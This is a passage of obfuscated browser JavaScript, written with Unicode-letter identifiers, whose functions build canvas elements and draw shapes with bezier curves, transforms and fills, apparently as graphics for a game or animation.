			var ⵠⵠᐃ = 90 * ᐃ;
			var ⵠⲆⵠ = ⵠΔΔᐃΔ * ᐃ;
			var ᐃⵠΔⲆ = ⲆΔⲆᐃ * ᐃ;
			var w2 = ᐃⵠⵠ / 2;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / ΔⵠⵠΔ;
			var ΔⵠΔΔ = 10 * ᐃ;
			var ⵠⲆΔΔΔᐃⲆ = 100 * ᐃ;
			var ⵠᐃⵠⲆΔᐃⵠ = ᐃ * ΔᐃΔᐃΔ;
			var ΔⲆⲆᐃΔᐃᐃ = ⵠⲆΔΔΔᐃⲆ / 2;
			var ΔᐃΔΔⵠΔΔ = ⵠᐃⵠⲆΔᐃⵠ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.save();
			Δ.translate(ᐃ * -80, -70 * ᐃ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.bezierCurveTo(130 * ᐃ, ᐃ * 79, ᐃ * 132, ᐃ * 86, ᐃ * 130, ᐃ * 93);
			Δ.bezierCurveTo(128 * ᐃ, ᐃ * ⵠᐃⲆΔΔ, ᐃ * 121, ᐃ * 107, 120 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(ᐃ * 120, 107 * ᐃ, 115 * ᐃ, 98 * ᐃ, ᐃ * 115, ᐃ * 92);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 86, ᐃ * 119, 76 * ᐃ, ᐃ * 127, ᐃ * 73);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[111]);
			Δ.restore();
			Δ.save();
			Δ.translate(-80 * ᐃ, -70 * ᐃ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 109, ᐃ * 111, ΔΔⲆⵠΔⲆⵠ * ᐃ, ᐃ * 106, ᐃ * 93);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 90, 91 * ᐃ, ᐃ * 87, 91 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(ᐃ * 91, ᐃ * 88, 91 * ᐃ, ᐃ * 96, ᐃ * 94, ᐃ * 102);
			Δ.bezierCurveTo(ᐃ * 97, 108 * ᐃ, ᐃ * 106, 112 * ᐃ, ᐃ * 113, ᐃ * 112);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[111]);
			Δ.restore();
			Δ.save();
			Δ.translate(-80 * ᐃ, -70 * ᐃ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 120, 100 * ᐃ, 119 * ᐃ, ᐃ * 91, ᐃ * 127);
			Δ.bezierCurveTo(ᐃ * 83, ᐃ * 134, 82 * ᐃ, 146 * ᐃ, 83 * ᐃ, 146 * ᐃ);
			Δ.bezierCurveTo(84 * ᐃ, 146 * ᐃ, 98 * ᐃ, ᐃ * 142, 103 * ᐃ, ᐃ * 138);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 135, ᐃ * 110, ᐃ * 130, ᐃ * 112, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[111]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃ * ΔΔᐃΔ, ᐃ * -93 + ᐃⵠΔⲆ);
			Δ.rotate(Math.PI / 5);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 79, 132 * ᐃ, 86 * ᐃ, ᐃ * 130, ᐃ * 93);
			Δ.bezierCurveTo(ᐃ * 128, ᐃ * ᐃᐃᐃⵠⵠⲆⵠ, ᐃ * 121, ᐃ * 107, 120 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(120 * ᐃ, 107 * ᐃ, 115 * ᐃ, ᐃ * 98, 115 * ᐃ, 92 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 86, 119 * ᐃ, ᐃ * 76, 127 * ᐃ, ᐃ * 73);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[111]);
			Δ.restore();
			Δ.save();
			Δ.translate(-80 * ᐃ, ᐃ * -70);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.beginPath();
			Δ.bezierCurveTo(130 * ᐃ, 79 * ᐃ, ᐃ * 132, ᐃ * 86, ᐃ * 130, 93 * ᐃ);
			Δ.bezierCurveTo(128 * ᐃ, 100 * ᐃ, 121 * ᐃ, 107 * ᐃ, 120 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(120 * ᐃ, 107 * ᐃ, ᐃ * 115, ᐃ * 98, 115 * ᐃ, ᐃ * 92);
			Δ.bezierCurveTo(115 * ᐃ, 86 * ᐃ, ᐃ * 119, ᐃ * 76, 127 * ᐃ, ᐃ * 73);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ], Ⲇᐃ[ᐃΔᐃⲆ], ⵠⲆⵠ);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃ * -80, -70 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 112, ᐃ * 109, ᐃ * 111, ᐃ * ΔᐃⵠⲆⲆ, ᐃ * 106, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104, ᐃ * 90, 91 * ᐃ, ᐃ * 87, 91 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 91, ᐃ * 88, ᐃ * 91, ᐃ * 96, ᐃ * 94, ᐃ * 102);
			Δ.bezierCurveTo(97 * ᐃ, 108 * ᐃ, 106 * ᐃ, ᐃ * 112, ᐃ * 113, ᐃ * 112);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃᐃⲆΔ], ⵠⲆⵠ);
			Δ.restore();
			Δ.save();
			Δ.translate(-80 * ᐃ, -70 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 120, ᐃ * 100, ᐃ * 119, ᐃ * 91, 127 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 83, 134 * ᐃ, 82 * ᐃ, 146 * ᐃ, ᐃ * 83, 146 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84, 146 * ᐃ, 98 * ᐃ, 142 * ᐃ, ᐃ * 103, 138 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, 135 * ᐃ, ᐃ * 110, ᐃ * 130, ᐃ * 112, ᐃ * 121);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆⵠ], ⵠⲆⵠ);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃ * ΔⲆΔᐃ, ᐃ * -93);
			Δ.rotate(Math.PI / 5);
			Δ.globalAlpha = ΔⵠΔⵠ;
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 130, 79 * ᐃ, ᐃ * 132, ᐃ * 86, 130 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128, 100 * ᐃ, 121 * ᐃ, ᐃ * 107, 120 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(120 * ᐃ, 107 * ᐃ, ᐃ * 115, 98 * ᐃ, 115 * ᐃ, 92 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115, ᐃ * 86, ᐃ * 119, ᐃ * 76, 127 * ᐃ, 73 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ], Ⲇᐃ[1], ⵠⲆⵠ);
			Δ.restore();
			return Ⲇⵠ
		}

		function ΔᐃⵠⲆᐃᐃⲆΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 350;
			Ⲇⵠ.height = 140 * ᐃ;
			Δ.translate(ᐃ * -50, -150 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 184.5, 222.0625 * ᐃ);
			Δ.bezierCurveTo(185.5 * ᐃ, ᐃ * 184.0625, ᐃ * 302.5, ᐃ * 171.0625, 313.5 * ᐃ, 222.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 330.5, 263.0625 * ᐃ, ᐃ * 181.5, ᐃ * 274.0625, ᐃ * 184.5, ᐃ * 223.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠΔΔ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 131.5, ᐃ * 241.0625);
			Δ.bezierCurveTo(ᐃ * 144.5, 278.0625 * ᐃ, ᐃ * 270.5, ᐃ * 209.0625, ᐃ * 228.5, ᐃ * 174.0625);
			Δ.bezierCurveTo(196.5 * ᐃ, 147.0625 * ᐃ, ᐃ * 117.5, 196.0625 * ᐃ, ᐃ * 131.5, ᐃ * 240.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[1], ᐃ * 8);
			ⵠᐃᐃ(Δ, 270.5 * ᐃ, 225.0625 * ᐃ, 15.811388300841896 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			ⵠᐃᐃ(Δ, ᐃ * 243.5, ᐃ * 225.0625, 6.082762530298219 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			ⵠᐃᐃ(Δ, 255.5 * ᐃ, ᐃ * 210.0625, ᐃ * 10.816653826391969);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 167.5, 215.0625 * ᐃ, 15.297058540778355 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ]);
			ⵠᐃᐃ(Δ, 176.5 * ᐃ, ᐃ * 204.0625, 7.280109889280518 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			ⵠᐃᐃ(Δ, 206.5 * ᐃ, 189.0625 * ᐃ, ᐃ * 7.280109889280518);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 151.5, 212.0625 * ᐃ);
			Δ.bezierCurveTo(161.5 * ᐃ, ᐃ * 204.0625, 173.5 * ᐃ, 214.0625 * ᐃ, ᐃ * 158.5, 221.0625 * ᐃ);
			Δ.bezierCurveTo(145.5 * ᐃ, ᐃ * 228.0625, 144.5 * ᐃ, 216.0625 * ᐃ, ᐃ * 151.5, 212.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ], Ⲇᐃ[4], ΔΔⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 194.5, 209.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 205.5, 202.0625 * ᐃ, ᐃ * 215.5, 207.0625 * ᐃ, 199.5 * ᐃ, ᐃ * 217.0625);
			Δ.bezierCurveTo(187.5 * ᐃ, ᐃ * 224.0625, ᐃ * 182.5, 217.0625 * ᐃ, 194.5 * ᐃ, 209.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(188.5 * ᐃ, ᐃ * 183.0625);
			Δ.bezierCurveTo(ᐃ * 201.5, ᐃ * 176.0625, ᐃ * 213.5, 187.0625 * ᐃ, ᐃ * 193.5, 193.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 185.5, ᐃ * 194.0625, ᐃ * 175.5, 189.0625 * ᐃ, ᐃ * 188.5, 183.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆᐃᐃΔ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(261.5 * ᐃ, ᐃ * 202.0625);
			Δ.bezierCurveTo(274.5 * ᐃ, ᐃ * 201.0625, 282.5 * ᐃ, 214.0625 * ᐃ, 261.5 * ᐃ, 215.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 246.5, ᐃ * 214.0625, ᐃ * 248.5, ᐃ * 203.0625, 261.5 * ᐃ, ᐃ * 202.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[4], ⵠⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 240.5, 231.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 255.5, ᐃ * 231.0625, ᐃ * 254.5, ᐃ * 243.0625, 240.5 * ᐃ, ᐃ * 242.0625);
			Δ.bezierCurveTo(ᐃ * 225.5, 239.0625 * ᐃ, ᐃ * 225.5, ᐃ * 232.0625, 240.5 * ᐃ, 231.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[4], ᐃ * ᐃⵠⵠΔ);
			return Ⲇⵠ
		}

		function ⲆⵠⲆΔⲆᐃⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 283 * ᐃ;
			Ⲇⵠ.height = 224 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * ᐃΔᐃⲆΔ, 33 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85, 62 * ᐃ, 102 * ᐃ, ᐃ * 66, 110 * ᐃ, 83 * ᐃ);
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[ⵠΔⲆⵠ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(181 * ᐃ, 32 * ᐃ);
			Δ.bezierCurveTo(196 * ᐃ, 62 * ᐃ, 181 * ᐃ, ᐃ * 68, 178 * ᐃ, 69 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⲆᐃⵠ], ᐃ * 40);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 225, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 228, ᐃ * 78, ᐃ * 207, ᐃ * 77, 192 * ᐃ, ᐃ * 88);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆⲆ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(34 * ᐃ, ᐃ * 134);
			Δ.bezierCurveTo(ᐃ * 46, 111 * ᐃ, ᐃ * 57, 111 * ᐃ, ᐃ * 79, ᐃ * 109);
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[ⵠⲆⲆ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(249 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 233, ᐃ * 107, ᐃ * 212, 112 * ᐃ, 202 * ᐃ, ᐃ * 115);
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[ΔⲆⵠⲆ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 56, ᐃ * 50);
			Δ.bezierCurveTo(56 * ᐃ, 82 * ᐃ, 73 * ᐃ, ᐃ * 82, 93 * ᐃ, ᐃ * 89);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⵠΔ], ᐃ * 40);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 93, 55 * ᐃ);
			Δ.bezierCurveTo(124 * ᐃ, 29 * ᐃ, 179 * ᐃ, 44 * ᐃ, 188 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 207, ᐃ * 64, ᐃ * 226, 94 * ᐃ, 231 * ᐃ, 118 * ᐃ);
			Δ.bezierCurveTo(236 * ᐃ, 145 * ᐃ, 222 * ᐃ, 184 * ᐃ, ᐃ * 193, ᐃ * 192);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 201, ᐃ * 116, ᐃ * 200, ᐃ * 93, ᐃ * 193);
			Δ.bezierCurveTo(ᐃ * 61, ᐃ * 180, 48 * ᐃ, 147 * ᐃ, 50 * ᐃ, 123 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 93, ᐃ * 76, ᐃ * 66, ᐃ * 92, ᐃ * 56);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ᐃΔⲆⲆᐃᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 290 * ᐃ;
			Ⲇⵠ.height = 525 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠΔⵠⵠᐃ * ᐃ, 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 112, ᐃ * 356);
			Δ.bezierCurveTo(124 * ᐃ, ᐃ * 220.5, ᐃ * 124, ᐃ * 220.5, ᐃ * 136, 85 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162.5, 65.5 * ᐃ, ᐃ * 162.5, ᐃ * 65.5, 189 * ᐃ, 46 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.5, 72.5 * ᐃ, ᐃ * 208.5, ᐃ * 72.5, ᐃ * 228, ᐃ * 99);
			Δ.bezierCurveTo(ᐃ * 200, 232 * ᐃ, ᐃ * 200, ᐃ * 232, ᐃ * 172, ᐃ * 365);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(131 * ᐃ, ᐃ * 423);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, ᐃ * -ΔⵠⵠΔⵠᐃⲆ, -53 * ᐃ, 28 * ᐃ, 106 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.save();
			Δ.translate(ᐃ * 122, ᐃ * 480);
			Δ.rotate(1.72);
			ⵠΔⵠᐃ(Δ, ⵠᐃΔΔ, 26.476404589747453 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(210 * ᐃ, ᐃ * 387);
			Δ.bezierCurveTo(ᐃ * 138, 376 * ᐃ, ᐃ * 138, ᐃ * 376, ᐃ * 66, 365 * ᐃ);
			Δ.bezierCurveTo(76 * ᐃ, ᐃ * 355, 76 * ᐃ, 355 * ᐃ, 86 * ᐃ, 345 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 99, 346.5 * ᐃ, 99 * ᐃ, 346.5 * ᐃ, 112 * ᐃ, 348 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128.5, 344 * ᐃ, ᐃ * 128.5, 344 * ᐃ, 145 * ᐃ, ᐃ * 340);
			Δ.bezierCurveTo(ᐃ * 158, ᐃ * 348, 158 * ᐃ, 348 * ᐃ, ᐃ * 171, 356 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 184, ᐃ * 358, 184 * ᐃ, ᐃ * 358, 197 * ᐃ, 360 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(129 * ᐃ, 338 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 137, ᐃ * 336, ᐃ * 137, ᐃ * 336, ᐃ * 145, 334 * ᐃ);
			Δ.bezierCurveTo(152.5 * ᐃ, ᐃ * 338, 152.5 * ᐃ, ᐃ * 338, ᐃ * 160, 342 * ᐃ);
			Δ.bezierCurveTo(184 * ᐃ, 224 * ᐃ, ᐃ * 184, ᐃ * 224, 208 * ᐃ, 106 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 197, ᐃ * 88, ᐃ * 187, ᐃ * 70, 186 * ᐃ, ᐃ * 70);
			Δ.bezierCurveTo(169.5 * ᐃ, 83 * ᐃ, ᐃ * 169.5, 83 * ᐃ, 153 * ᐃ, 96 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -20, -20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 112, ᐃ * 356);
			Δ.bezierCurveTo(124 * ᐃ, ᐃ * 220.5, 124 * ᐃ, 220.5 * ᐃ, 136 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 162.5, ᐃ * 65.5, 162.5 * ᐃ, ᐃ * 65.5, ᐃ * 189, ᐃ * 46);
			Δ.bezierCurveTo(208.5 * ᐃ, ᐃ * 72.5, 208.5 * ᐃ, 72.5 * ᐃ, 228 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(200 * ᐃ, ᐃ * 232, ᐃ * 200, 232 * ᐃ, 172 * ᐃ, 365 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[2], 12.5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 131, 423 * ᐃ);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, ᐃ * -14, -53 * ᐃ, 28 * ᐃ, ᐃ * 106, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 12.5 * ᐃ);
			Δ.save();
			Δ.translate(122 * ᐃ, ᐃ * 480);
			Δ.rotate(1.72);
			ⵠΔⵠᐃ(Δ, 4, 26.476404589747453 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δᐃⵠⵠ], ᐃ * 12.5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 210, ᐃ * 387);
			Δ.bezierCurveTo(138 * ᐃ, 376 * ᐃ, 138 * ᐃ, ᐃ * 376, 66 * ᐃ, 365 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, 355 * ᐃ, ᐃ * 76, 355 * ᐃ, 86 * ᐃ, 345 * ᐃ);
			Δ.bezierCurveTo(99 * ᐃ, ᐃ * 346.5, ᐃ * 99, ᐃ * 346.5, 112 * ᐃ, 348 * ᐃ);
			Δ.bezierCurveTo(128.5 * ᐃ, ᐃ * 344, ᐃ * 128.5, ᐃ * 344, 145 * ᐃ, ᐃ * 340);
			Δ.bezierCurveTo(158 * ᐃ, ᐃ * 348, 158 * ᐃ, 348 * ᐃ, ᐃ * 171, ᐃ * 356);
			Δ.bezierCurveTo(184 * ᐃ, ᐃ * 358, ᐃ * 184, ᐃ * 358, ᐃ * 197, ᐃ * 360);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[2], 12.5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(129 * ᐃ, 338 * ᐃ);
			Δ.bezierCurveTo(137 * ᐃ, 336 * ᐃ, 137 * ᐃ, 336 * ᐃ, 145 * ᐃ, 334 * ᐃ);
			Δ.bezierCurveTo(152.5 * ᐃ, 338 * ᐃ, 152.5 * ᐃ, 338 * ᐃ, 160 * ᐃ, 342 * ᐃ);
			Δ.bezierCurveTo(184 * ᐃ, ᐃ * 224, 184 * ᐃ, ᐃ * 224, ᐃ * 208, ᐃ * 106);
			Δ.bezierCurveTo(ᐃ * 197, ᐃ * 88, ᐃ * 187, ᐃ * 70, ᐃ * 186, ᐃ * 70);
			Δ.bezierCurveTo(169.5 * ᐃ, 83 * ᐃ, ᐃ * 169.5, 83 * ᐃ, 153 * ᐃ, 96 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			return Ⲇⵠ
		}

		function ⲆⲆᐃᐃΔΔⲆⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 217 * ᐃ;
			Ⲇⵠ.height = 215 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(79 * ᐃ, ᐃ * 113);
			Δ.bezierCurveTo(ᐃ * 135, 98 * ᐃ, 136 * ᐃ, 96 * ᐃ, ᐃ * 142, 97 * ᐃ);
			Δ.bezierCurveTo(167 * ᐃ, 106 * ᐃ, ᐃ * 167, ᐃ * 106, 171 * ᐃ, 109 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 173, ᐃ * 120, 173 * ᐃ, 134 * ᐃ, 169 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(140 * ᐃ, 149.5 * ᐃ, 140 * ᐃ, 149.5 * ᐃ, 111 * ᐃ, 158 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[ⲆⲆΔᐃ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(154 * ᐃ, 103 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 91, 175 * ᐃ, ᐃ * 87, ᐃ * 176, 94 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 175, ᐃ * 102, ᐃ * 176, 102 * ᐃ, ᐃ * 186, ᐃ * 103);
			Δ.bezierCurveTo(ᐃ * 191, 104 * ᐃ, 192 * ᐃ, ᐃ * 105, ᐃ * 185, 116 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 183, ᐃ * 120, ᐃ * 191, ᐃ * 124, 189 * ᐃ, 129 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 185, 139 * ᐃ, 178 * ᐃ, 134 * ᐃ, 166 * ᐃ, ᐃ * 131);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(60 * ᐃ, ᐃ * 46);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 34, 60 * ᐃ, 29 * ᐃ, 56 * ᐃ, ᐃ * ΔΔⲆᐃⵠ);
			Δ.bezierCurveTo(52 * ᐃ, ⵠΔᐃΔᐃ * ᐃ, ᐃ * 52, ᐃⲆᐃᐃΔ * ᐃ, 49 * ᐃ, ᐃ * 24);
			Δ.bezierCurveTo(ᐃ * 48, 27 * ᐃ, ᐃ * 46, ᐃ * 28, ᐃ * 39, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 33, ᐃ * 26, ᐃ * 34, 31 * ᐃ, ᐃ * 35, 37 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 36, 41 * ᐃ, 27 * ᐃ, 46 * ᐃ, ᐃ * 29, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 36, ᐃ * 55, ᐃ * 35, 56 * ᐃ, ᐃ * 31, ᐃ * 59);
